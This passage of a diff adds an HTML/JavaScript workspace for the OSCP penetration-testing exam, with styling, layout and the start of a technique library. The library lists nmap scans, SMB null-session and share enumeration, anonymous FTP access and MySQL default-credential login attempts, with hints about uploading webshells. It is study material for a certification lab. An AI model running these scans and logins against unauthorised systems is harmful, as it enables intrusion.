@@ -1,0 +1,1747 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>OSCP Exam-Day Workspace</title>
+<style>
+/* ============================================================
+   Design tokens — small, derived system. Calm workbench, not cockpit.
+   ============================================================ */
+:root{
+  /* surfaces */
+  --bg:#f6f5f1;
+  --surface:#fffefb;
+  --surface-2:#f1efe9;
+  --surface-3:#eae7df;
+  --border:#e2ded4;
+  --border-strong:#cfc9bb;
+
+  /* text */
+  --text:#211f1b;
+  --text-2:#5a554b;
+  --text-3:#908a7c;
+
+  /* one restrained accent = "do this next" */
+  --accent:#3d5a99;
+  --accent-ink:#2c4576;
+  --accent-soft:#eaeef7;
+  --accent-line:#c7d3ea;
+
+  /* muted status colours */
+  --worked:#2f7d4f;
+  --worked-soft:#e7f2ea;
+  --failed:#b2483f;
+  --failed-soft:#f6e8e6;
+  --partial:#a9772a;
+  --partial-soft:#f6efe1;
+
+  /* spacing scale */
+  --s1:4px; --s2:8px; --s3:12px; --s4:16px; --s5:24px; --s6:32px; --s7:48px;
+
+  /* radii */
+  --r1:6px; --r2:10px; --r3:14px;
+
+  /* type */
+  --sans:system-ui,-apple-system,"Segoe UI","DejaVu Sans",Roboto,sans-serif;
+  --mono:ui-monospace,"DejaVu Sans Mono","SFMono-Regular",Menlo,Consolas,monospace;
+
+  /* shadow */
+  --shadow-1:0 1px 2px rgba(40,36,28,.06), 0 1px 1px rgba(40,36,28,.04);
+  --shadow-2:0 8px 24px rgba(40,36,28,.12), 0 2px 6px rgba(40,36,28,.08);
+
+  /* easing — stronger than CSS defaults */
+  --ease-out:cubic-bezier(0.23,1,0.32,1);
+  --ease-in-out:cubic-bezier(0.77,0,0.175,1);
+}
+@media (prefers-color-scheme: dark){
+  :root{
+    --bg:#1a1916;
+    --surface:#242219;
+    --surface-2:#2c2a20;
+    --surface-3:#34322a;
+    --border:#3a382e;
+    --border-strong:#4a4738;
+    --text:#ece9e0;
+    --text-2:#b6b1a3;
+    --text-3:#857f70;
+    --accent:#8fa9dd;
+    --accent-ink:#aabde6;
+    --accent-soft:#26303f;
+    --accent-line:#3a4761;
+    --worked:#7cc497;
+    --worked-soft:#243029;
+    --failed:#e08a80;
+    --failed-soft:#352523;
+    --partial:#dcb066;
+    --partial-soft:#332d1f;
+    --shadow-1:0 1px 2px rgba(0,0,0,.4);
+    --shadow-2:0 10px 30px rgba(0,0,0,.5);
+  }
+}
+
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+  margin:0;
+  background:var(--bg);
+  color:var(--text);
+  font-family:var(--sans);
+  font-size:14px;
+  line-height:1.5;
+  -webkit-font-smoothing:antialiased;
+}
+button{font-family:inherit;font-size:inherit;color:inherit}
+input,select,textarea{font-family:inherit;font-size:inherit}
+code,kbd,.mono{font-family:var(--mono)}
+
+/* focus — always visible */
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+button:focus-visible{outline-offset:2px}
+
+/* ---------- buttons ---------- */
+.btn{
+  display:inline-flex;align-items:center;gap:var(--s2);
+  border:1px solid var(--border-strong);
+  background:var(--surface);
+  color:var(--text);
+  padding:7px 12px;border-radius:var(--r1);
+  cursor:pointer;font-weight:500;
+  transition:transform 140ms var(--ease-out), background 140ms var(--ease-out), border-color 140ms var(--ease-out);
+  white-space:nowrap;
+}
+@media (hover:hover) and (pointer:fine){
+  .btn:hover{background:var(--surface-2);border-color:var(--text-3)}
+}
+.btn:active{transform:scale(0.97)}
+.btn.accent{background:var(--accent);border-color:var(--accent);color:#fff}
+.btn.accent:hover{background:var(--accent-ink);border-color:var(--accent-ink)}
+@media (prefers-color-scheme: dark){.btn.accent{color:#16140f}}
+.btn.ghost{background:transparent;border-color:transparent}
+.btn.ghost:hover{background:var(--surface-2)}
+.btn.sm{padding:4px 9px;font-size:12.5px}
+.btn.tiny{padding:3px 7px;font-size:11.5px;border-radius:5px}
+
+.chip{
+  border:1px solid var(--border-strong);background:var(--surface);
+  padding:4px 10px;border-radius:999px;cursor:pointer;font-size:12.5px;color:var(--text-2);
+  transition:transform 120ms var(--ease-out), background 120ms var(--ease-out), color 120ms var(--ease-out), border-color 120ms var(--ease-out);
+}
+.chip:active{transform:scale(0.96)}
+.chip[aria-pressed="true"]{background:var(--accent-soft);border-color:var(--accent-line);color:var(--accent-ink);font-weight:600}
+
+/* status pills */
+.pill{display:inline-flex;align-items:center;gap:5px;font-size:11.5px;font-weight:600;padding:2px 8px;border-radius:999px;border:1px solid transparent}
+.pill .dot{width:7px;height:7px;border-radius:50%}
+.pill.worked{background:var(--worked-soft);color:var(--worked)} .pill.worked .dot{background:var(--worked)}
+.pill.failed{background:var(--failed-soft);color:var(--failed)} .pill.failed .dot{background:var(--failed)}
+.pill.partial{background:var(--partial-soft);color:var(--partial)} .pill.partial .dot{background:var(--partial)}
+.pill.new{background:var(--surface-3);color:var(--text-2)} .pill.new .dot{background:var(--text-3)}
+.pill.foothold{background:var(--accent-soft);color:var(--accent-ink)} .pill.foothold .dot{background:var(--accent)}
+.pill.rooted{background:var(--worked-soft);color:var(--worked)} .pill.rooted .dot{background:var(--worked)}
+.pill.abandoned{background:var(--surface-3);color:var(--text-3)} .pill.abandoned .dot{background:var(--text-3)}
+
+/* ============================================================
+   Layout
+   ============================================================ */
+.app{display:flex;flex-direction:column;height:100vh;min-height:0}
+
+/* topbar */
+.topbar{
+  display:flex;align-items:center;gap:var(--s4);flex-wrap:wrap;
+  padding:10px var(--s5);
+  background:var(--surface);border-bottom:1px solid var(--border);
+  box-shadow:var(--shadow-1);z-index:5;
+}
+.brand{display:flex;align-items:baseline;gap:8px;font-weight:700;letter-spacing:-.01em}
+.brand .sub{font-weight:500;color:var(--text-3);font-size:12px;letter-spacing:0}
+.tb-stat{display:flex;flex-direction:column;line-height:1.15}
+.tb-stat .k{font-size:10.5px;text-transform:uppercase;letter-spacing:.06em;color:var(--text-3);font-weight:600}
+.tb-stat .v{font-size:18px;font-weight:700;font-variant-numeric:tabular-nums}
+.tb-stat .v.mono{font-family:var(--mono);font-size:16px}
+.clock-low{color:var(--failed)!important}
+.tb-spacer{flex:1 1 auto}
+.tb-actions{display:flex;gap:var(--s2);flex-wrap:wrap}
+.tb-box{
+  display:flex;align-items:center;gap:8px;border:1px solid var(--border-strong);
+  background:var(--surface);border-radius:var(--r1);padding:5px 10px;cursor:pointer;max-width:280px;
+  transition:background 140ms var(--ease-out),border-color 140ms var(--ease-out),transform 140ms var(--ease-out);
+}
+.tb-box:hover{background:var(--surface-2)}
+.tb-box:active{transform:scale(.98)}
+.tb-box .nm{font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.tb-box .ip{font-family:var(--mono);font-size:12px;color:var(--text-3)}
+.caret{color:var(--text-3)}
+
+/* mobile tab bar (hidden on wide) */
+.tabbar{display:none}
+
+/* main grid */
+.main{flex:1 1 auto;display:grid;grid-template-columns:300px minmax(0,1fr) 360px;gap:0;min-height:0}
+.col{min-height:0;display:flex;flex-direction:column;overflow:hidden;border-right:1px solid var(--border)}
+.col:last-child{border-right:none}
+.col-head{padding:14px var(--s4) 10px;border-bottom:1px solid var(--border);background:var(--surface)}
+.col-head h2{margin:0;font-size:13px;text-transform:uppercase;letter-spacing:.05em;color:var(--text-2);font-weight:700}
+.col-head .hint{margin:2px 0 0;font-size:12px;color:var(--text-3)}
+.col-body{flex:1 1 auto;overflow-y:auto;padding:var(--s4);scrollbar-width:thin}
+.col-body.pad-sm{padding:var(--s3)}
+
+/* left tinted slightly to read as the "guidance" rail */
+.col.left{background:var(--surface-2)}
+.col.left .col-head{background:var(--surface-2)}
+.col.right{background:var(--surface-2)}
+.col.right .col-head{background:var(--surface-2)}
+
+/* ---------- suggestion cards ---------- */
+.sec-label{font-size:11px;text-transform:uppercase;letter-spacing:.06em;color:var(--text-3);font-weight:700;margin:var(--s5) 0 var(--s2)}
+.sec-label:first-child{margin-top:0}
+.sugg{
+  background:var(--surface);border:1px solid var(--accent-line);
+  border-left:3px solid var(--accent);border-radius:var(--r2);
+  padding:11px 12px;margin-bottom:var(--s2);box-shadow:var(--shadow-1);
+}
+.sugg .t{font-weight:650;font-size:13.5px;display:flex;align-items:center;gap:6px}
+.sugg .why{color:var(--text-2);font-size:12.5px;margin:3px 0 9px}
+.sugg .row{display:flex;gap:6px;flex-wrap:wrap;align-items:center}
+.sugg.warn{border-color:var(--partial);border-left-color:var(--partial);background:var(--partial-soft)}
+
+/* box board */
+.board-item{
+  display:flex;align-items:center;gap:10px;width:100%;text-align:left;
+  background:var(--surface);border:1px solid var(--border);border-radius:var(--r2);
+  padding:9px 11px;margin-bottom:7px;cursor:pointer;
+  transition:transform 130ms var(--ease-out),border-color 130ms var(--ease-out),background 130ms var(--ease-out);
+}
+.board-item:hover{background:var(--surface-2)}
+.board-item:active{transform:scale(.99)}
+.board-item.active{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent) inset}
+.board-item .meta{flex:1 1 auto;min-width:0}
+.board-item .nm{font-weight:650;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.board-item .ln{font-size:11.5px;color:var(--text-3);display:flex;gap:8px;flex-wrap:wrap;margin-top:2px}
+.board-item .ln .mono{font-family:var(--mono)}
+.board-pts{font-variant-numeric:tabular-nums;font-weight:700;font-size:13px;color:var(--text-2)}
+
+/* ---------- arsenal ---------- */
+.arsenal-bar{display:flex;flex-direction:column;gap:10px;padding:12px var(--s4);border-bottom:1px solid var(--border);background:var(--surface)}
+.searchwrap{position:relative;display:flex;align-items:center}
+.searchwrap input{
+  width:100%;padding:9px 12px 9px 34px;border:1px solid var(--border-strong);border-radius:var(--r1);
+  background:var(--surface-2);color:var(--text);
+}
+.searchwrap .ico{position:absolute;left:11px;color:var(--text-3);pointer-events:none}
+.searchwrap .slash{position:absolute;right:10px;color:var(--text-3);border:1px solid var(--border-strong);border-radius:4px;padding:0 6px;font-family:var(--mono);font-size:11px}
+.filters{display:flex;flex-direction:column;gap:7px}
+.filt-row{display:flex;gap:6px;flex-wrap:wrap;align-items:center}
+.filt-row .lab{font-size:10.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--text-3);font-weight:700;width:54px;flex:none}
+
+.center-tabs{display:flex;gap:4px;padding:8px var(--s4) 0;background:var(--surface);border-bottom:1px solid var(--border)}
+.center-tab{
+  padding:8px 14px;border:1px solid transparent;border-bottom:none;border-radius:8px 8px 0 0;
+  background:transparent;cursor:pointer;color:var(--text-2);font-weight:600;font-size:13px;position:relative;top:1px;
+  transition:background 130ms var(--ease-out),color 130ms var(--ease-out);
+}
+.center-tab[aria-selected="true"]{background:var(--surface-2);border-color:var(--border);color:var(--text)}
+.center-tab:hover{color:var(--text)}
+.count-tag{color:var(--text-3);font-weight:600;font-size:12px;margin-left:6px}
+
+.card{
+  background:var(--surface);border:1px solid var(--border);border-radius:var(--r2);
+  margin-bottom:9px;box-shadow:var(--shadow-1);overflow:hidden;
+  transition:border-color 140ms var(--ease-out);
+}
+.card.open{border-color:var(--border-strong)}
+.card-head{display:flex;align-items:flex-start;gap:10px;padding:12px 13px;cursor:pointer}
+.card-head:hover{background:var(--surface-2)}
+.card-head .body{flex:1 1 auto;min-width:0}
+.card-head .title{font-weight:650;font-size:14px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.card-head .summary{color:var(--text-2);font-size:12.5px;margin-top:2px}
+.card-tags{display:flex;gap:5px;flex-wrap:wrap;margin-top:7px}
+.tag{font-size:10.5px;font-weight:600;color:var(--text-3);background:var(--surface-3);border-radius:4px;padding:1px 7px;letter-spacing:.02em}
+.tag.phase{color:var(--accent-ink);background:var(--accent-soft)}
+.chev{color:var(--text-3);transition:transform 180ms var(--ease-out);margin-top:2px;flex:none}
+.card.open .chev{transform:rotate(90deg)}
+
+.card-detail{padding:0 13px 13px;border-top:1px solid var(--border)}
+.card-detail .dh{font-size:10.5px;text-transform:uppercase;letter-spacing:.06em;color:var(--text-3);font-weight:700;margin:13px 0 6px}
+.cmd{
+  display:flex;align-items:flex-start;gap:8px;background:var(--surface-2);border:1px solid var(--border);
+  border-radius:var(--r1);padding:8px 10px;margin-bottom:6px;cursor:pointer;
+  transition:border-color 130ms var(--ease-out),background 130ms var(--ease-out);
+}
+.cmd:hover{border-color:var(--accent-line);background:var(--accent-soft)}
+.cmd .ct{flex:1 1 auto;min-width:0}
+.cmd code{display:block;font-size:12.5px;color:var(--text);word-break:break-word;white-space:pre-wrap}
+.cmd .note{color:var(--text-3);font-size:11.5px;margin-top:3px}
+.cmd .copy{flex:none;color:var(--text-3);font-size:11px;display:flex;align-items:center;gap:4px;padding-top:1px}
+.look{margin:0;padding-left:18px}
+.look li{color:var(--text-2);font-size:12.5px;margin-bottom:3px}
+.logbar{display:flex;gap:7px;align-items:center;flex-wrap:wrap;margin-top:13px;padding-top:12px;border-top:1px dashed var(--border-strong)}
+.logbar input.note-in{flex:1 1 160px;min-width:120px;padding:6px 9px;border:1px solid var(--border-strong);border-radius:var(--r1);background:var(--surface-2)}
+.log-w{border-color:var(--worked);color:var(--worked)}
+.log-f{border-color:var(--failed);color:var(--failed)}
+.log-p{border-color:var(--partial);color:var(--partial)}
+@media (hover:hover){.log-w:hover{background:var(--worked-soft)}.log-f:hover{background:var(--failed-soft)}.log-p:hover{background:var(--partial-soft)}}
+
+.empty{color:var(--text-3);text-align:center;padding:var(--s6) var(--s4);font-size:13px}
+
+/* ---------- live log + capture ---------- */
+.cap{background:var(--surface);border:1px solid var(--border);border-radius:var(--r2);padding:11px;margin-bottom:9px}
+.cap h3{margin:0 0 8px;font-size:12px;text-transform:uppercase;letter-spacing:.05em;color:var(--text-2);font-weight:700}
+.cap .frm{display:flex;gap:6px;flex-wrap:wrap}
+.cap input{flex:1 1 90px;min-width:60px;padding:6px 9px;border:1px solid var(--border-strong);border-radius:var(--r1);background:var(--surface-2)}
+.cap .frm input.short{flex:1 1 70px}
+.facts{display:flex;flex-wrap:wrap;gap:5px;margin-top:9px}
+.fact{display:inline-flex;align-items:center;gap:6px;font-size:11.5px;background:var(--surface-2);border:1px solid var(--border);border-radius:999px;padding:3px 6px 3px 10px}
+.fact.mono{font-family:var(--mono)}
+.fact .x{cursor:pointer;color:var(--text-3);width:16px;height:16px;display:inline-flex;align-items:center;justify-content:center;border-radius:50%}
+.fact .x:hover{background:var(--failed-soft);color:var(--failed)}
+.fact-grp{margin-top:10px}
+.fact-grp .gl{font-size:10.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--text-3);font-weight:700;margin-bottom:4px}
+
+.entry{
+  background:var(--surface);border:1px solid var(--border);border-left:3px solid var(--text-3);
+  border-radius:var(--r2);padding:10px 11px;margin-bottom:8px;box-shadow:var(--shadow-1);
+}
+.entry.worked{border-left-color:var(--worked)}
+.entry.failed{border-left-color:var(--failed)}
+.entry.partial{border-left-color:var(--partial)}
+.entry .top{display:flex;align-items:center;gap:8px;justify-content:space-between}
+.entry .ttl{font-weight:650;font-size:13px}
+.entry .ts{font-family:var(--mono);font-size:11px;color:var(--text-3);flex:none}
+.entry .cmd-line{font-family:var(--mono);font-size:11.5px;color:var(--text-2);background:var(--surface-2);border-radius:5px;padding:5px 8px;margin:7px 0;word-break:break-word;white-space:pre-wrap;cursor:pointer}
+.entry .cmd-line:hover{background:var(--accent-soft)}
+.entry .note-edit{width:100%;border:1px dashed var(--border-strong);background:transparent;border-radius:5px;padding:4px 7px;color:var(--text-2);font-size:12px;margin-top:4px}
+.entry .erow{display:flex;align-items:center;gap:10px;margin-top:8px;flex-wrap:wrap}
+.proof-tog{display:inline-flex;align-items:center;gap:6px;font-size:11.5px;color:var(--text-3);cursor:pointer;user-select:none}
+.proof-tog input{width:14px;height:14px;accent-color:var(--worked)}
+.proof-tog.on{color:var(--worked);font-weight:600}
+.entry .del{margin-left:auto;color:var(--text-3);cursor:pointer;font-size:11.5px}
+.entry .del:hover{color:var(--failed)}
+@keyframes flashIn{from{background:var(--accent-soft);transform:translateY(-4px);opacity:.4}to{background:var(--surface);transform:none;opacity:1}}
+@media (prefers-reduced-motion:no-preference){.entry.flash{animation:flashIn 420ms var(--ease-out)}}
+
+/* ---------- attack map ---------- */
+.map-wrap{padding:var(--s4)}
+.lane{margin-bottom:var(--s4)}
+.lane-h{display:flex;align-items:center;gap:8px;font-size:11px;text-transform:uppercase;letter-spacing:.06em;font-weight:700;color:var(--text-3);margin-bottom:9px}
+.lane-h .ln-dot{width:9px;height:9px;border-radius:50%;background:var(--accent)}
+.node{
+  position:relative;background:var(--surface);border:1px solid var(--border);border-radius:var(--r2);
+  padding:10px 12px;margin:0 auto 6px;max-width:520px;box-shadow:var(--shadow-1);
+}
+.node.partial{border-style:dashed;border-color:var(--partial)}
+.node .nt{font-weight:650;font-size:13px}
+.node .nc{font-family:var(--mono);font-size:11px;color:var(--text-3);margin-top:3px;word-break:break-word}
+.flowline{display:flex;justify-content:center;color:var(--accent-line)}
+.flowline svg{display:block}
+.root-node{background:var(--worked-soft);border-color:var(--worked);text-align:center;font-weight:700;color:var(--worked);max-width:280px;margin:6px auto 0}
+.graveyard{margin-top:var(--s5);border-top:1px solid var(--border);padding-top:var(--s4)}
+.graveyard summary{cursor:pointer;font-size:12px;font-weight:700;color:var(--failed);text-transform:uppercase;letter-spacing:.05em}
+.graveyard ul{margin:10px 0 0;padding-left:18px}
+.graveyard li{color:var(--text-2);font-size:12.5px;margin-bottom:4px}
+.graveyard li .gc{font-family:var(--mono);font-size:11px;color:var(--text-3)}
+
+/* ---------- modal ---------- */
+.scrim{position:fixed;inset:0;background:rgba(30,26,20,.42);display:flex;align-items:center;justify-content:center;padding:var(--s5);z-index:50}
+@media (prefers-reduced-motion:no-preference){
+  .scrim{animation:scrimIn 160ms var(--ease-out)}
+  .modal{animation:modalIn 220ms var(--ease-out)}
+}
+@keyframes scrimIn{from{opacity:0}to{opacity:1}}
+@keyframes modalIn{from{opacity:0;transform:scale(.96)}to{opacity:1;transform:scale(1)}}
+.modal{
+  background:var(--surface);border:1px solid var(--border-strong);border-radius:var(--r3);
+  box-shadow:var(--shadow-2);max-width:640px;width:100%;max-height:85vh;overflow-y:auto;
+  transform-origin:center; /* modal scales from center per design skill */
+}
+.modal-h{display:flex;align-items:center;justify-content:space-between;padding:16px 20px;border-bottom:1px solid var(--border);position:sticky;top:0;background:var(--surface)}
+.modal-h h2{margin:0;font-size:16px}
+.modal-b{padding:18px 20px}
+.modal-b h3{font-size:13px;margin:16px 0 6px;color:var(--accent-ink)}
+.modal-b h3:first-child{margin-top:0}
+.modal-b ul{margin:0 0 8px;padding-left:20px}
+.modal-b li{margin-bottom:5px;color:var(--text-2)}
+.modal-b li b,.modal-b li strong{color:var(--text)}
+.modal-b .mono{font-family:var(--mono);font-size:12.5px;background:var(--surface-2);padding:1px 5px;border-radius:4px}
+.formgrid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.formgrid label{display:flex;flex-direction:column;gap:4px;font-size:12px;font-weight:600;color:var(--text-2)}
+.formgrid input,.formgrid select{padding:8px 10px;border:1px solid var(--border-strong);border-radius:var(--r1);background:var(--surface-2);color:var(--text);font-weight:400}
+.full{grid-column:1/-1}
+.danger{color:var(--failed)}
+.note-block{background:var(--partial-soft);border:1px solid var(--partial);border-radius:var(--r2);padding:11px 13px;font-size:12.5px;color:var(--text-2);margin-bottom:14px}
+.note-block b{color:var(--partial)}
+
+/* ---------- toast ---------- */
+.toast-wrap{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);z-index:80;display:flex;flex-direction:column;gap:8px;align-items:center;pointer-events:none}
+.toast{
+  background:var(--text);color:var(--bg);padding:9px 16px;border-radius:999px;font-size:13px;font-weight:600;
+  box-shadow:var(--shadow-2);
+}
+@media (prefers-reduced-motion:no-preference){.toast{animation:toastIn 200ms var(--ease-out)}}
+@keyframes toastIn{from{opacity:0;transform:translateY(10px) scale(.96)}to{opacity:1;transform:none}}
+
+/* ============================================================
+   Responsive — collapse to tabs
+   ============================================================ */
+@media (max-width:1080px){
+  .main{grid-template-columns:1fr}
+  .col{border-right:none;border-bottom:1px solid var(--border)}
+  .col{display:none}
+  .col.shown{display:flex}
+  .tabbar{display:flex;background:var(--surface);border-bottom:1px solid var(--border);padding:6px;gap:6px;position:sticky;top:0;z-index:4}
+  .tabbar button{flex:1;padding:10px;border:1px solid transparent;border-radius:var(--r1);background:transparent;cursor:pointer;font-weight:600;color:var(--text-2);transition:background 130ms var(--ease-out)}
+  .tabbar button[aria-selected="true"]{background:var(--accent-soft);color:var(--accent-ink)}
+  .tb-stat.hide-sm{display:none}
+}
+@media (max-width:540px){
+  .topbar{padding:8px 12px;gap:10px}
+  .formgrid{grid-template-columns:1fr}
+  .col-body{padding:12px}
+}
+</style>
+</head>
+<body>
+<div class="app">
+  <!-- ===================== TOPBAR ===================== -->
+  <header class="topbar">
+    <div class="brand">OSCP<span class="sub">exam-day workspace</span></div>
+    <div class="tb-stat">
+      <span class="k">Time left</span>
+      <span class="v mono" id="clock">--:--:--</span>
+    </div>
+    <div class="tb-stat hide-sm">
+      <span class="k">Points</span>
+      <span class="v" id="points">0 / 70</span>
+    </div>
+    <button class="tb-box" id="boxSwitch" title="Switch / manage boxes">
+      <span style="display:flex;flex-direction:column;min-width:0">
+        <span class="nm" id="boxName">No box</span>
+        <span class="ip" id="boxIp">—</span>
+      </span>
+      <span class="caret">▾</span>
+    </button>
+    <div class="tb-spacer"></div>
+    <div class="tb-actions">
+      <button class="btn sm accent" id="btnStuck">I'm stuck</button>
+      <button class="btn sm" id="btnExport">Export .md</button>
+      <button class="btn sm" id="btnBackup">Backup JSON</button>
+      <button class="btn sm" id="btnImport">Import</button>
+      <button class="btn sm" id="btnRules">Rules</button>
+    </div>
+  </header>
+
+  <!-- mobile tabs -->
+  <nav class="tabbar" id="tabbar" role="tablist">
+    <button role="tab" data-tab="left" aria-selected="false">Suggested</button>
+    <button role="tab" data-tab="center" aria-selected="true">Arsenal</button>
+    <button role="tab" data-tab="right" aria-selected="false">Log</button>
+  </nav>
+
+  <!-- ===================== MAIN ===================== -->
+  <div class="main" id="main">
+    <!-- LEFT: suggestions + board -->
+    <section class="col left" id="col-left" data-col="left">
+      <div class="col-head">
+        <h2>Suggested next checks</h2>
+        <p class="hint">Updates as you log facts &amp; progress.</p>
+      </div>
+      <div class="col-body" id="suggBody"></div>
+    </section>
+
+    <!-- CENTER: arsenal / attack map -->
+    <section class="col center shown" id="col-center" data-col="center">
+      <div class="center-tabs" role="tablist">
+        <button class="center-tab" role="tab" data-ctab="arsenal" aria-selected="true">Arsenal<span class="count-tag" id="arsenalCount"></span></button>
+        <button class="center-tab" role="tab" data-ctab="map" aria-selected="false">Attack map</button>
+      </div>
+      <div id="arsenalBarWrap">
+        <div class="arsenal-bar">
+          <div class="searchwrap">
+            <span class="ico">⌕</span>
+            <input id="search" type="text" placeholder="Search techniques — title, summary, signals…" aria-label="Search techniques">
+            <span class="slash">/</span>
+          </div>
+          <div class="filters" id="filters"></div>
+        </div>
+      </div>
+      <div class="col-body" id="arsenalBody"></div>
+      <div class="col-body" id="mapBody" style="display:none"></div>
+    </section>
+
+    <!-- RIGHT: live log + capture -->
+    <section class="col right" id="col-right" data-col="right">
+      <div class="col-head">
+        <h2>Live log &amp; capture</h2>
+        <p class="hint">Newest first. Capture facts to power suggestions.</p>
+      </div>
+      <div class="col-body pad-sm" id="rightBody"></div>
+    </section>
+  </div>
+</div>
+
+<div class="toast-wrap" id="toasts"></div>
+<input type="file" id="importFile" accept="application/json,.json" style="display:none">
+
+<script>
+"use strict";
+/* ============================================================
+   OSCP Exam-Day Workspace — single file, offline, no AI, no exec.
+   It guides and logs. Commands are copy-only.
+   ============================================================ */
+
+/* ---------------- phase metadata ---------------- */
+const PHASES = {
+  recon:             {label:"Recon",            stage:"recon"},
+  enum:              {label:"Service enum",     stage:"recon"},
+  web:               {label:"Web",              stage:"foothold"},
+  access:            {label:"Access / creds",   stage:"foothold"},
+  "privesc-linux":   {label:"Linux privesc",    stage:"privesc"},
+  "privesc-windows": {label:"Windows privesc",  stage:"privesc"},
+  ad:                {label:"Active Directory", stage:"privesc"},
+  pivot:             {label:"Pivoting",         stage:"foothold"},
+  meta:              {label:"Reference",        stage:"recon"},
+};
+const STAGE_ORDER = ["recon","foothold","privesc"];
+const STAGE_LABEL = {recon:"Recon & enumeration",foothold:"Foothold",privesc:"Privilege escalation"};
+function phaseLabel(p){return (PHASES[p]&&PHASES[p].label)||p;}
+function phaseStage(p){return (PHASES[p]&&PHASES[p].stage)||"foothold";}
+
+/* ============================================================
+   Technique library — manual, exam-legal methodology only.
+   No payloads, no auto-pwn. Pointers a candidate types themselves.
+   ============================================================ */
+const CARDS = [
+/* ---------- RECON ---------- */
+{ id:"recon-full", phase:"recon", service:"any", title:"Full TCP port scan FIRST",
+  summary:"Never enumerate a partial port list — the missed port is the box.",
+  commands:[
+    {cmd:"nmap -p- --min-rate=2000 -T4 -Pn <IP> -oN ports.txt", note:"Every TCP port, fast."},
+    {cmd:"nmap -p<found> -sCV -Pn <IP> -oN services.txt", note:"Default scripts + versions on the open ports."},
+    {cmd:"nmap -sU --top-ports 25 -Pn <IP> -oN udp.txt", note:"SNMP/TFTP/DNS hide in UDP."}],
+  look:["Versions you can map to a public exploit","Web, SMB, DBs first — best foothold odds","Odd high ports — often the intended path"],
+  triggers:{ports:[],os:"any",needsShell:false,type:"any"} },
+{ id:"recon-scv", phase:"recon", service:"any", title:"Targeted -sCV on open ports",
+  summary:"Once -p- gives you the open set, deep-scan only those.",
+  commands:[
+    {cmd:"nmap -p 22,80,445 -sCV -A -Pn <IP> -oN services.txt", note:"Replace with your actual open ports."},
+    {cmd:"nmap -p<port> --script vuln -Pn <IP>", note:"NSE vuln scripts (allowed) on a specific service."}],
+  look:["Exact product + version strings","Hostnames / domains in TLS certs & headers","NSE script hits worth chasing"],
+  triggers:{ports:[],os:"any",needsShell:false,type:"any"} },
+{ id:"recon-udp", phase:"recon", service:"any", title:"UDP top-ports scan",
+  summary:"UDP services are easy to forget and often the way in.",
+  commands:[
+    {cmd:"nmap -sU --top-ports 50 -Pn <IP> -oN udp.txt", note:"SNMP(161), TFTP(69), DNS(53), NTP, IKE."},
+    {cmd:"nmap -sU -p 161 -sV <IP>", note:"Confirm SNMP if 161 shows open|filtered."}],
+  look:["161 SNMP — try public/community strings","69 TFTP — anonymous file pull","53 DNS — zone transfer"],
+  triggers:{ports:[],os:"any",needsShell:false,type:"any"} },
+
+/* ---------- SERVICE ENUM ---------- */
+{ id:"enum-http", phase:"enum", service:"http", title:"HTTP/HTTPS enumeration",
+  summary:"Web is the most common foothold — enumerate it thoroughly.",
+  commands:[
+    {cmd:"whatweb http://<IP>/ ; curl -sI http://<IP>/", note:"Tech stack + headers."},
+    {cmd:"nikto -h http://<IP>/ -o nikto.txt", note:"Quick misconfig sweep (allowed)."},
+    {cmd:"curl -s http://<IP>/robots.txt ; curl -s http://<IP>/sitemap.xml", note:"Cheap wins."},
+    {cmd:"# View source + JS files for endpoints, comments, creds", note:"Read everything by hand."}],
+  look:["Software + version → searchsploit it","Login pages, upload forms, admin panels","Comments / hidden fields / API paths in JS"],
+  triggers:{ports:[80,443,8080,8000,8443],os:"any",needsShell:false,type:"any"} },
+{ id:"enum-smb", phase:"enum", service:"smb", title:"SMB enumeration (139/445)",
+  summary:"Null sessions, shares, and users — classic foothold.",
+  commands:[
+    {cmd:"smbclient -L //<IP>/ -N", note:"List shares with a null session."},
+    {cmd:"smbmap -H <IP> -u '' -p ''", note:"Share permissions at a glance."},
+    {cmd:"crackmapexec smb <IP> -u '' -p '' --shares", note:"Auth + share enum."},
+    {cmd:"enum4linux-ng -A <IP>", note:"Users, groups, OS, policy."},
+    {cmd:"smbclient //<IP>/<share> -N", note:"Browse a readable share; recurse + get files."}],
+  look:["READ/WRITE shares — pull/plant files","Usernames for spraying","SMB version → EternalBlue-class only after manual review"],
+  triggers:{ports:[139,445],os:"any",needsShell:false,type:"any"} },
+{ id:"enum-ftp", phase:"enum", service:"ftp", title:"FTP enumeration (21)",
+  summary:"Anonymous login and writable roots are frequent.",
+  commands:[
+    {cmd:"ftp <IP>   # user: anonymous  pass: anonymous", note:"Try anon first."},
+    {cmd:"# inside: ls -la ; binary ; prompt ; mget *", note:"Grab everything."},
+    {cmd:"nmap -p21 --script ftp-anon,ftp-syst <IP>", note:"Anon + version."}],
+  look:["Anonymous read — config/source/creds","Writable dir + web root overlap → upload webshell","Banner version → searchsploit"],
+  triggers:{ports:[21],os:"any",needsShell:false,type:"any"} },
+{ id:"enum-ssh", phase:"enum", service:"ssh", title:"SSH enumeration (22)",
+  summary:"Rarely the foothold itself — but creds you find unlock it.",
+  commands:[
+    {cmd:"nmap -p22 --script ssh2-enum-algos,ssh-auth-methods <IP>", note:"Auth methods, key vs password."},
+    {cmd:"ssh <user>@<IP>", note:"Use any creds/keys you've found."},
+    {cmd:"ssh -i id_rsa <user>@<IP>", note:"Found a private key? chmod 600 it first."}],
+  look:["password vs publickey auth allowed","Old OpenSSH user-enum vulns (review manually)","Reused creds from web/SMB"],
+  triggers:{ports:[22],os:"any",needsShell:false,type:"any"} },
+{ id:"enum-mysql", phase:"enum", service:"mysql", title:"MySQL enumeration (3306)",
+  summary:"Default/weak creds and readable files.",
+  commands:[
+    {cmd:"mysql -h <IP> -u root -p", note:"Try root / blank / found creds."},
+    {cmd:"nmap -p3306 --script mysql-info,mysql-empty-password <IP>", note:"Banner + empty-pass check."},
+    {cmd:"# in mysql: show databases; use db; show tables; select * from users;", note:"Hunt creds/hashes."}],
